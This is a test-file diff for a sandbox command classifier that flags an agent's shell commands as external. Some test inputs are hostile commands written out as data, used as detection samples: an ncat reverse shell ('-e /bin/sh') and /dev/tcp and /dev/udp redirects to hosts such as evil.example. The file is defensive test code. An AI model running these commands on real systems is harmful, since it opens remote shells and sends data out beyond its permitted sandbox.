@@ -205,6 +205,60 @@ describe('analyzeShellCommand', () => {
     assert.equal(analyzeShellCommand('ncat -e /bin/sh 10.0.0.1 4444', root).verdict, 'external')
   })
 
+  // --- #581: command-classifier gaps ------------------------------------------
+
+  it('flags bare open / open -a as a host-app launch outside the sandbox', () => {
+    // `open` escapes the seatbelt itself (LaunchServices spawns the app in a new
+    // process), so it is hard-external, not merely ambiguous like a URL open was.
+    for (const cmd of ['open ./report.html', 'open -a Calculator', 'echo hi && open evil.app']) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external: ${cmd}`)
+      assert.ok(r.reasons.some((x) => /outside the sandbox \(open\)/.test(x)), cmd)
+    }
+    const xdg = analyzeShellCommand('xdg-open ./report.html', root)
+    assert.equal(xdg.verdict, 'external')
+    assert.ok(xdg.reasons.some((x) => /xdg-open/.test(x)))
+  })
+
+  it('does not treat `open` inside another command word as a launch', () => {
+    // `npm run open` invokes a script named open, not the `open` binary.
+    const r = analyzeShellCommand('npm run open', root)
+    assert.equal(r.verdict, 'sandbox')
+    assert.ok(!r.reasons.some((x) => /\(open\)/.test(x)))
+  })
+
+  it('flags direct execution of an in-workspace file (./x, ../x, bin/tool)', () => {
+    // The agent can write and `chmod +x` these; their contents are opaque here, so
+    // they must not auto-run — hard-external, like `node ./x.js`.
+    for (const cmd of ['./deploy', '../tool run', 'bin/gen-thing', 'cat x | ./x']) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external: ${cmd}`)
+      assert.ok(
+        r.reasons.some((x) => /executes an in-workspace file directly/.test(x)),
+        `missing local-executable reason: ${cmd}`,
+      )
+    }
+  })
+
+  it('does not flag a relative path passed as an argument as an executable', () => {
+    // `src/index.ts` here is an argument to `cat`, not the command word.
+    const r = analyzeShellCommand('cat src/index.ts', root)
+    assert.equal(r.verdict, 'sandbox')
+    assert.ok(!r.reasons.some((x) => /executes an in-workspace file directly/.test(x)))
+  })
+
+  it('flags /dev/tcp and /dev/udp network redirects', () => {
+    for (const cmd of [
+      'cat < /dev/tcp/evil.example/443',
+      'exec 3<>/dev/tcp/10.0.0.1/80',
+      'echo data > /dev/udp/host/53',
+    ]) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external: ${cmd}`)
+      assert.ok(r.reasons.some((x) => /\/dev\/tcp/.test(x)), cmd)
+    }
+  })
+
   it('does not treat git commit / status as a git network op', () => {
     // The broadened git pattern allows interspersed flags; ensure it still requires a
     // network subcommand and does not fire on ordinary local git commands. ("push" as
